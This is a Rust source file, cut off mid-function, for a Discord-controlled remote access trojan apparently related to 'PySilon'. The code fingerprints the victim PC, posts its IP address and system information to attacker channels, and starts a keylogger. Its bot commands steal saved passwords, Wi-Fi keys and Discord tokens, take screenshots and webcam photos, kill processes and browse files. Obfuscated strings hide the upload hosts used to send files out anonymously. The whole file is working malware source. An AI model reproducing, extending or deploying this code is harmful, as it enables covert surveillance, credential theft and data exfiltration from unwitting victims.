use std::{path::Path, time::{SystemTime, Duration}, collections::HashMap, fs, process::Command, os::windows::process::CommandExt};
use chrono::{DateTime, Local};
use once_cell::sync::Lazy;
use rand::distributions::{Alphanumeric, DistString};
use reqwest::multipart;
use serde_json::{json, Value};
use serenity::{async_trait, model::{prelude::*, channel::Message}, prelude::*, framework::standard::{macros::{command, group}, StandardFramework, CommandResult}};
use obfstr::*;
use tokio::{io::{BufReader, AsyncReadExt, BufWriter, AsyncWriteExt}, fs::File};
use crate::{BOT_TOKENS, BOT_TO_SEND, SERVER_ID, CHANNEL_IDS, CATEGORY_NAME, password_grabber, discord_token_grabber::FetchTokens, keylogger::KeyLogger, webcam, wifi, screenshot, processes::{self, ProcessSorting}, MESSAGE_INTERACTION, tree, PROXIES, registry, download, PROXY_ALL, upload, PYSILON_KEY, SOFTWARE_EXECUTABLE_NAME, SOFTWARE_DIRECTORY_NAME};
static FILEURLS: Lazy<Mutex<Vec<(String, String, String)>>>= Lazy::new(|| Mutex::new(Vec::new()));
static DELETE_FILES: Lazy<Mutex<bool>>= Lazy::new(|| Mutex::new(false));
#[group]
#[commands(ss, grab, webcam, show, kill, pwd, tree, proxy, ls, cd, download, download_tar, execute, cmd, remove, upload, implode, update)]
struct General;
struct Handler {
    is_loop_runing: Mutex<bool>
}
#[async_trait]
impl EventHandler for Handler {
    async fn cache_ready(&self, ctx: Context, guilds: Vec<GuildId>) {
        for guild in guilds {
            if guild.0== *SERVER_ID.lock().await {
                let hwid_proc= std::process::Command::new("wmic")
                    .args(["csproduct", "get", "uuid"]).output().unwrap();
                let hwid_output= String::from_utf8_lossy(&hwid_proc.stdout);
                let hwid= hwid_output.split("\n").collect::<Vec<&str>>()[1].trim_end();
                *CATEGORY_NAME.lock().await= hwid.to_string();
                let mut first_run= true;
                let mut category_channel_names= vec![];
                if let Ok(channels)= guild.channels(&ctx).await {
                    for (_, guildchannel) in channels {
                        match guildchannel.kind {
                            ChannelType::Category => {
                                if guildchannel.name()== hwid {
                                    first_run= false;
                                }
                            },
                            ChannelType::Text | ChannelType::Voice => {
                                match guildchannel.parent_id {
                                    Some(category) => {
                                        let category= category.edit(&ctx, |c| c).await.unwrap();
                                        if category.name()== hwid.to_string() {
                                            category_channel_names.push(guildchannel);
                                        }
                                    },
                                    None => {}
                                }
                            },
                            _ => {}
                        }
                    }
                }
                if first_run {
                    let category= &guild.create_channel(&ctx, |c| {c.kind(ChannelType::Category).name(hwid)}).await.unwrap();
                    let info= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("info").category(category)}).await.unwrap();
                    let main= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("main").category(category)}).await.unwrap();
                    let spam= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("spam").category(category)}).await.unwrap();
                    let file= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Text).name("file-related").category(category)}).await.unwrap();
                    let recordings= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Voice).name("recordings").category(category)}).await.unwrap();
                    let voice= guild.create_channel(&ctx, move |c| {c.kind(ChannelType::Voice).name("Live microphone").category(category)}).await.unwrap();
                    let mut channel_ids= CHANNEL_IDS.lock().await;
                    channel_ids.insert("info", Some(info.id.0));
                    channel_ids.insert("main", Some(main.id.0));
                    channel_ids.insert("spam", Some(spam.id.0));
                    channel_ids.insert("file", Some(file.id.0));
                    channel_ids.insert("recordings", Some(recordings.id.0));
                    channel_ids.insert("voice", Some(voice.id.0));
                    drop(channel_ids);
                    tokio::spawn(async {
                        let client= reqwest::Client::new();
                        let req= client.execute(client.get(obfstr!("https://ident.me")).build().unwrap()).await.unwrap();
                        let request= req.text().await.unwrap();
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                            "content": format!("```IP Address: {} [ident.me]```", request)
                        }));
                    });
                    tokio::spawn(async {
                        let client= reqwest::Client::new();
                        let req= client.execute(client.get(obfstr!("https://ipv4.lafibre.info/ip.php")).build().unwrap()).await.unwrap();
                        let request= req.text().await.unwrap();
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": CHANNEL_IDS.lock().await.get("info").unwrap().unwrap_or(0),
                            "content": format!("```IP Address: {} [lafibre.info]```", request)
                        }));
                    });
                    let system_info_proc= std::process::Command::new("systeminfo").output().unwrap();
                    let system_info_output= String::from_utf8_lossy(&system_info_proc.stdout);
                    let mut chunk= String::new();
                    for line in system_info_output.split("\n").collect::<Vec<&str>>() {
                        let line= line.trim_end();
                        if chunk.len() + line.len()> 1990 {
                            BOT_TO_SEND.lock().await.push(json!({
                                "channel": info,
                                "content": format!("```{}```", chunk)
                            }));
                            chunk= line.to_owned() + "\n";
                        }else{
                            chunk+= &(line.to_owned() + "\n");
                        }
                    }
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": info,
                        "content": format!("```{}```", chunk)
                    }));
                }else{
                    let mut channel_ids= CHANNEL_IDS.lock().await;
                    for channel in category_channel_names {
                        match channel.name().to_lowercase().as_str() {
                            "info" => channel_ids.insert("info", Some(channel.id.0)),
                            "main" => channel_ids.insert("main", Some(channel.id.0)),
                            "spam" => channel_ids.insert("spam", Some(channel.id.0)),
                            "file-related" => channel_ids.insert("file", Some(channel.id.0)),
                            "recordings" => channel_ids.insert("recordings", Some(channel.id.0)),
                            "live microphone" => channel_ids.insert("voice", Some(channel.id.0)),
                            _ => None
                        };
                    }
                    drop(channel_ids);
                }
                tokio::spawn(async {
                    KeyLogger::main().await;
                });
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": CHANNEL_IDS.lock().await.get("main").unwrap().unwrap_or(0),
                    "content": format!("** **\n\n\n```Starting new PC session at {} on HWID {}```",
                        Into::<DateTime<Local>>::into(SystemTime::now()).format("%d/%m/%Y %r").to_string(),
                        hwid)
                }));
                break;
            }
        }
        tokio::spawn(async move {
            loop {
                let proxy_all= *PROXY_ALL.lock().await;
                while BOT_TO_SEND.lock().await.len()> 0 {
                    let mut channel= ChannelId::default();
                    let result= BOT_TO_SEND.lock().await[0]["channel"].as_u64();
                    if let Some(channel_id)= result {
                        if channel_id< 1 {
                            if let Some(delete_files)= BOT_TO_SEND.lock().await[0]["delete_files"].as_bool() {
                                if delete_files {
                                    if let Some(files)= BOT_TO_SEND.lock().await[0]["files"].as_array() {
                                        for file in files {
                                            fs::remove_file(Path::new(file.as_str().unwrap())).unwrap();
                                        }
                                    }
                                }
                            }
                            continue;
                        }
                        channel.0= channel_id;
                        FILEURLS.lock().await.clear();
                        *DELETE_FILES.lock().await= false;
                        if let Some(delete_files)= BOT_TO_SEND.lock().await[0]["delete_files"].as_bool() {
                            if delete_files {
                                *DELETE_FILES.lock().await= true;
                            }
                        }
                        let mut threads= Vec::new();
                        let files= (BOT_TO_SEND.lock().await[0]["files"].as_array().unwrap_or(&Vec::new())).clone();
                        let mut file_amount: u64= 0;
                        let mut file_size= 0;
                        for file in files {
                            let filestr= file.as_str().unwrap().to_string();
                            let filelen= Path::new(&filestr).metadata().unwrap().len();
                            file_amount+= 1;
                            if proxy_all || filelen> 25 * 1024 * 1024 || file_amount> 10 || file_size> 25 * 1024 * 1024 {
                                threads.push(tokio::spawn(async move {
                                    let path= Path::new(&filestr);
                                    let mut sizepre= "B";
                                    let mut sizeam= filelen as f64;
                                    while sizeam>= 1000. {
                                        sizeam/= 1024.;
                                        sizepre= match sizepre {"B" => "KiB", "KiB" => "MiB", "MiB" => "GiB", "GiB" => "TiB", _ => "???"};
                                    }
                                    let client= reqwest::Client::new();
                                    let proxies= PROXIES.lock().await.clone();
                                    for proxy in &proxies {
                                        match proxy.as_str() {
                                            "gofile" => {
                                                let req= client.execute(client.get(obfstr!("https://api.gofile.io/getServer")).build().unwrap()).await.unwrap();
                                                match req.json::<Value>().await.unwrap()["data"]["server"].as_str() {
                                                    Some(server) => {
                                                        let mut f= BufReader::new(File::open(path).await.unwrap());
                                                        let mut fv= Vec::new();
                                                        f.read_to_end(&mut fv).await.unwrap();
                                                        drop(f);
                                                        let form= multipart::Form::new().part("file", 
                                                            multipart::Part::bytes(fv)
                                                                .file_name(path.file_name().unwrap().to_string_lossy().to_string())
                                                        );
                                                        match client.execute(client.post(&format!("https://{}{}", server, obfstr!(".gofile.io/uploadFile"))).multipart(form).build().unwrap()).await {
                                                            Ok(req) => {
                                                                let response= req.json::<Value>().await.unwrap();
                                                                match response["status"].as_str() {
                                                                    Some(status) => {
                                                                        if status== "ok" {
                                                                            FILEURLS.lock().await.push((format!("[GoFile]({})", response["data"]["downloadPage"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                        }else{
                                                                            FILEURLS.lock().await.push((format!("GoFile] | Error: An error occurred while uploading the file."), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                        }
                                                                    }
                                                                    None => {}
                                                                }
                                                            }
                                                            Err(_) => {
                                                                FILEURLS.lock().await.push((format!("GoFile] | Error: An error occurred while connecting."), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                            }
                                                        }
                                                    }
                                                    None => {}
                                                }
                                            }
                                            "pixeldrain" => {
                                                let mut f= BufReader::new(File::open(path).await.unwrap());
                                                let mut fv= Vec::new();
                                                f.read_to_end(&mut fv).await.unwrap();
                                                drop(f);
                                                let form= multipart::Form::new().part("file", 
                                                    multipart::Part::bytes(fv)
                                                        .file_name(path.file_name().unwrap().to_string_lossy().to_string())
                                                );
                                                match client.execute(client.post(obfstr!("https://pixeldrain.com/api/file")).multipart(form).header("anonymous", "true").build().unwrap()).await {
                                                    Ok(req) => {
                                                        let response= req.json::<Value>().await.unwrap();
                                                        match response["success"].as_bool() {
                                                            Some(status) => {
                                                                if status== true {
                                                                    FILEURLS.lock().await.push((format!("[Pixeldrain](https://pixeldrain.com/u/{})", response["id"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                }else{
                                                                    FILEURLS.lock().await.push((format!("Pixeldrain | Error: {}", response["message"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                }
                                                            }
                                                            _ => {}
                                                        }
                                                    }
                                                    Err(_) => {
                                                        FILEURLS.lock().await.push((format!("Pixeldrain | Error: An error occurred while connecting."), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                    }
                                                }
                                            }
                                            "anonfiles" => {
                                                let mut f= BufReader::new(File::open(path).await.unwrap());
                                                let mut fv= Vec::new();
                                                f.read_to_end(&mut fv).await.unwrap();
                                                drop(f);
                                                let form= multipart::Form::new().part("file", 
                                                    multipart::Part::bytes(fv)
                                                        .file_name(path.file_name().unwrap().to_string_lossy().to_string())
                                                );
                                                match client.execute(client.post(obfstr!("https://api.anonfiles.com/upload")).multipart(form).header("anonymous", "true").build().unwrap()).await{
                                                    Ok(req) => {
                                                        let response= req.json::<Value>().await.unwrap();
                                                        match response["status"].as_bool() {
                                                            Some(status) => {
                                                                if status== true {
                                                                    FILEURLS.lock().await.push((format!("[Anonfiles]({})", response["data"]["file"]["url"]["short"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                }else{
                                                                    FILEURLS.lock().await.push((format!("Anonfiles | Error: {}", response["error"]["message"].as_str().unwrap()), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                                }
                                                            }
                                                            _ => {}
                                                        }
                                                    }
                                                    Err(_) => {
                                                        FILEURLS.lock().await.push((format!("Anonfiles | Error: An error occurred while connecting."), path.file_name().unwrap().to_string_lossy().to_string(), format!("{sizeam:.2} {sizepre}")));
                                                    }
                                                }
                                            }
                                            _ => {}
                                        }
                                    }
                                    if path.exists() {
                                        if *DELETE_FILES.lock().await {
                                            let _= fs::remove_file(path);
                                        }
                                    }
                                }));
                            }else{
                                file_size+= filelen;
                            }
                        }
                        for thread in threads {
                            if !thread.is_finished() {
                                let _= thread.await;
                            }
                        }
                        let msg= &BOT_TO_SEND.lock().await[0];
                        let mut fileurls= FILEURLS.lock().await;
                        let message= channel.send_message(&ctx, move |m| {
                            if let Some(content)= msg["content"].as_str() {
                                m.content(content);
                            }
                            if let Some(files)= msg["files"].as_array() {
                                let mut file_amount: u64= 0;
                                let mut file_size= 0;
                                for file in files {
                                    let path= Path::new(file.as_str().unwrap());
                                    if path.exists() {
                                        let filelen= path.metadata().unwrap().len();
                                        file_amount+= 1;
                                        if !proxy_all && filelen<= 25 * 1024 * 1024 && file_amount<= 10 && file_size<= 25 * 1024 * 1024 {
                                            m.add_file(path);
                                            file_size+= filelen;
                                        }
                                    }
                                }
                            }
                            if let Some(embed)= msg["embed"].as_bool() {
                                if embed {
                                    m.add_embed(|e| {
                                        if let Some(title)= msg["title"].as_str() {
                                            e.title(title);
                                        }
                                        if let Some(description)= msg["description"].as_str() {
                                            e.description(description);
                                        }
                                        if let Some(color)= msg["color"].as_u64() {
                                            e.color(color);
                                        }
                                        if let Some(thumbnail)= msg["thumbnail"].as_str() {
                                            e.thumbnail(thumbnail);
                                        }
                                        if let Some(fields)= msg["fields"].as_array() {
                                            for field in fields {
                                                e.field(field["name"].as_str().unwrap(), field["value"].as_str().unwrap(), field["inline"].as_bool().unwrap());
                                            }
                                        }
                                        if let Some(image)= msg["image"].as_str() {
                                            e.image(image);
                                        }
                                        e
                                    });
                                }
                            }
                            if fileurls.len()> 0 {
                                m.add_embed(|e| {
                                    e.title("Proxied Files");
                                    e.color(0xff1418);
                                    let mut desc= String::new();
                                    let mut entries= HashMap::new();
                                    let mut is_desc= true;
                                    while fileurls.len()> 0 {
                                        let entry= fileurls.remove(0);
                                        if !entries.contains_key(&entry.1) {
                                            let newt= format!("\n**{} (📥 {})**\n\n", entry.1, entry.2);
                                            if is_desc {
                                                if desc.len() + newt.len()> 4096 {
                                                    is_desc= false;
                                                    e.description(&desc);
                                                    println!("desc:{}", desc);
                                                    desc.clear();
                                                    desc+= &newt;
                                                }else{
                                                    desc+= &newt;
                                                }
                                            }else{
                                                if desc.len() + newt.len()> 1024 {
                                                    e.field("** **", &desc, false);
                                                    println!("field:{}", desc);
                                                    desc.clear();
                                                    desc+= &newt;
                                                }else{
                                                    desc+= &newt;
                                                }
                                            }
                                            entries.insert(entry.1.clone(), 0u8);
                                        }
                                        desc+= &format!("{}\n", entry.0);
                                    }
                                    if is_desc {
                                        e.description(desc);
                                    }else if desc.len()> 0 {
                                        e.field("** **", &desc, false);
                                    }
                                    e
                                });
                            }
                            m
                        }).await.unwrap();
                        if let Some(delete_files)= msg["delete_files"].as_bool() {
                            if delete_files {
                                if let Some(files)= msg["files"].as_array() {
                                    for file in files {
                                        let _= std::fs::remove_file(Path::new(file.as_str().unwrap()));
                                    }
                                }
                            }
                        }
                        if let Some(interaction)= msg.get("interaction") {
                            MESSAGE_INTERACTION.lock().await.insert(format!("{}-{}", message.channel_id.0, message.id.0), interaction.clone());
                        }
                        if let Some(reactions)= msg["react"].as_array() {
                            for reaction in reactions {
                                message.react(&ctx, ReactionType::Unicode(reaction.as_str().unwrap().to_string())).await.unwrap();
                            }
                        }
                    }
                    BOT_TO_SEND.lock().await.remove(0);
                }
                tokio::time::sleep(Duration::from_secs_f64(1.0 / 60.0)).await;
            }
        });
        *self.is_loop_runing.lock().await= true;
    }
    async fn reaction_add(&self, ctx: Context, reaction: Reaction) {
        let userm;
        match reaction.member {
            Some(v) => {
                let partialmember= v;
                match partialmember.user {
                    Some(v) => {
                        userm= v;
                        if userm.bot {
                            return;
                        }
                    }, None => {
                        userm= user::User::default();
                    }
                }
            }, None => return
        }
        let mut interaction= None;
        let key= format!("{}-{}", reaction.channel_id.0, reaction.message_id.0);
        if MESSAGE_INTERACTION.lock().await.contains_key(&key) {
            interaction= MESSAGE_INTERACTION.lock().await.remove(&key);
        }
        if reaction.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            match reaction.emoji.to_string().as_str() {
                "📌" => {
                    reaction.channel_id.pin(&ctx, reaction.message_id).await.unwrap();
                }
                "🔴" => {
                    reaction.channel_id.delete_message(&ctx, reaction.message_id).await.unwrap();
                }
                "💀" => {
                    if interaction.is_some() {
                        let interaction= interaction.unwrap();
                        match interaction["kind"].as_str().unwrap_or("") {
                            "kill" => {
                                reaction.channel_id.delete_message(&ctx, reaction.message_id).await.unwrap();
                                processes::kill_process_confirmed(format!("{}#{:04}", userm.name, userm.discriminator), reaction.channel_id.0, interaction["pid"].as_u64().unwrap() as u32).await;
                            }
                            "implode" => {
                                reaction.channel_id.delete_message(&ctx, reaction.message_id).await.unwrap();
                                registry::remove().await;
                                let path= std::env::var_os("USERPROFILE").unwrap().to_string_lossy().to_string() + "\\" + &SOFTWARE_DIRECTORY_NAME.lock().await.to_lowercase() + "\\";
                                let _= Command::new("cmd.exe")
                                    .raw_arg(format!("/c taskkill /f /pid {} && rmdir /q /s {}", std::process::id(), path)).spawn();
                            }
                            _ => {}
                        }
                    }
                }
                _ => {}
            }
        }
    }
    async fn reaction_remove(&self, ctx: Context, reaction: Reaction) {
        match reaction.member {
            Some(v) => {
                match v.user {
                    Some(v) => {
                        if v.bot {
                            return;
                        }
                    }, None => {}
                }
            }, None => {}
        }
        if reaction.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            match reaction.emoji.to_string().as_str() {
                "📌" => {
                    reaction.channel_id.unpin(&ctx, reaction.message_id).await.unwrap();
                }
                _ => {}
            }
        }
    }
}
pub struct DiscordBot;
impl DiscordBot {
    pub async fn main() {
        let framework= StandardFramework::new()
            .configure(|c| c.prefix("."))
            .group(&GENERAL_GROUP);
        let token;
        loop {
            match BOT_TOKENS.try_lock() {
                Ok(mut value) => {
                    token= value.remove(0);
                    break;
                },
                Err(_) => {}
            }
        }
        let intents= GatewayIntents::all();
        let mut client= Client::builder(token, intents)
            .event_handler(Handler {
                is_loop_runing: Mutex::new(false)
            })
            .framework(framework)
            .await.unwrap();
        let _= client.start().await;
    }
}
#[command]
async fn ss(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let channelid= msg.channel_id.0;
        tokio::spawn(async move {
            screenshot::main(channelid).await;
        });
    }
    Ok(())
}
#[command]
async fn grab(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let args= msg.content.split(" ").collect::<Vec<&str>>();
        if args.len()> 1 {
            let channelid= msg.channel_id.0;
            match args[1] {
                "passwords" | "pass" | "password" => {
                    tokio::spawn(async move {
                        password_grabber::main(channelid).await;
                    });
                }
                "wifi" => {
                    tokio::spawn(async move {
                        wifi::main(channelid).await;
                    });
                }
                "discord" | "disc" => {
                    tokio::spawn(async move {
                        FetchTokens::new().await.upload(channelid).await;
                    });
                }
                _ => {show_help= true;}
            }
        }else{
            show_help= true;
        }
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .grab <action>\nActions:\n    pass, password, passwords - get the target PC's passwords\n    wifi - get the target PC's wifi passwords\n    discord, disc - get the target PC's tokens```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn webcam(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let args= msg.content.split(" ").collect::<Vec<&str>>();
        if args.len()> 1 && args[1]== "photo" {
            let channel_id= msg.channel_id.0;
            tokio::spawn(async move {
                webcam::main(channel_id).await;
            });
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .webcam <action>\nActions:\n    photo - take a photo with the target PC's webcam```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn show(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let args= msg.content.split(" ").collect::<Vec<&str>>();
        if args.len()> 1 {
            let channelid= msg.channel_id.0;
            match args[1] {
                "proc" | "processes" => {
                    let mut sorting= ProcessSorting::Name;
                    if args.len()> 2 {
                        match args[2] {
                            "cpu" | "2" => {sorting= ProcessSorting::Cpu;}
                            "mem" | "ram" | "3" => {sorting= ProcessSorting::Mem;}
                            "pid" | "id" | "4" => {sorting= ProcessSorting::Pid;}
                            _ => {}
                        }
                    }
                    tokio::spawn(async move {
                        processes::main(channelid, sorting).await;
                    });
                }
                _ => {
                    show_help= true;
                }
            }
        }else{
            show_help= true;
        }
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .show <action> [options]\nActions:\n    proc, processes - get the target PC's processes\n        Options: Sorting (default: name)\n            cpu - sort by highest cpu usage\n            mem - sort by highest ram usage\n            pid - sort by pids from the least to highest```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn kill(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let args= msg.content.split(" ").collect::<Vec<&str>>();
        if args.len()> 1 {
            let channelid= msg.channel_id.0;
            match args[1].parse::<u32>() {
                Ok(pid) => {
                    tokio::spawn(async move {
                        processes::kill_process(channelid, pid).await;
                    });
                }
                Err(_) => {
                    show_help= true;
                }
            }
        }
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .kill <pid>\nPid:\n    The process ID on the target's PC to kill```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn pwd(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```You are right now in: {}```", std::env::current_dir().unwrap().to_string_lossy()),
                    "react": ["🔴"]
                }));
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn tree(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let channelid= msg.channel_id.0;
                let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                tokio::spawn(async move {
                    tree::main(channelid, user).await;
                });
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn proxy(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let mut args= msg.content.split(" ").collect::<Vec<&str>>();
        if args.len()<= 1 {
            show_help= true;
        }else{
            match args[1] {
                "list" => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": &format!("```The current proxies are: \"{}\"```", PROXIES.lock().await.join(", ")),
                        "react": ["🔴"]
                    }));
                    return Ok(());
                }
                "every_file" => {
                    let cur= *PROXY_ALL.lock().await;
                    *PROXY_ALL.lock().await= !cur;
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": if cur {
                            format!("```❗ Now not proxying every files.```")
                        }else{
                            format!("```❗ Now proxying every files.```")
                        },
                        "react": ["🔴"]
                    }));
                    registry::update_proxies().await;
                    return Ok(());
                }
                _ => {

                }
            }
            if args[1]== "list" {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```The current proxies are: \"{}\"```", PROXIES.lock().await.join(", ")),
                    "react": ["🔴"]
                }));
                return Ok(());
            }else{
                PROXIES.lock().await.clear();
            }
        }
        while args.len()> 1 {
            let name= args.remove(1);
            match name {
                "gofile" | "pixeldrain" | "anonfiles" => {
                    PROXIES.lock().await.push(name.to_string());
                }
                _ => {
                    show_help= true;
                    if PROXIES.lock().await.len()== 0 {
                        PROXIES.lock().await.push("pixeldrain".to_string());
                    }
                    break;
                }
            }
        }
        registry::update_proxies().await;
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .proxy <proxy/list/every_file> [proxy] ...\nProxy: Servers for uploading files\n    gofile - 25> MiB\n    pixeldrain - 25> MiB, 19.5< GiB\n    anonfiles - 25> MiB, 20< GiB\nList: List current proxies.\nEvery_file: Toggle proxy every uploaded file.```",
                "react": ["🔴"]
            }));
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```Set proxies to: \"{}\"```", PROXIES.lock().await.join(", ")),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn ls(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let channelid= msg.channel_id.0;
                let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                tokio::spawn(async move {
                    tree::main_ls(channelid, user).await;
                });
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn cd(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let args= msg.content.split(" ").collect::<Vec<&str>>();
                if args.len()> 1 {
                    let channelid= msg.channel_id.0;
                    let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                    let arg= args[1..].join(" ").to_string();
                    tokio::spawn(async move {
                        tree::main_cd(channelid, user, arg).await;
                    });
                }else{
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": "```Syntax: .cd <dir> \nDirectory (dir): Directory to go to```",
                        "react": ["🔴"]
                    }));
                }
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                    "react": ["🔴"]
                }));
            }
        }
    }
    Ok(())
}
#[command]
async fn download(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() {
        if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
            let _= msg.delete(ctx).await;
            if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
                let args= msg.content.split(" ").collect::<Vec<&str>>();
                if args.len()<= 1 {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": "```Syntax: .download <file/dir>\nFile/Directory (dir): Target to download files```",
                        "react": ["🔴"]
                    }));
                }else{
                    let channelid= msg.channel_id.0;
                    let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                    let input= args[1..].join(" ").to_string();
                    tokio::spawn(async move {
                        download::main(channelid, user, input, false).await;
                    });
                }
            }else{
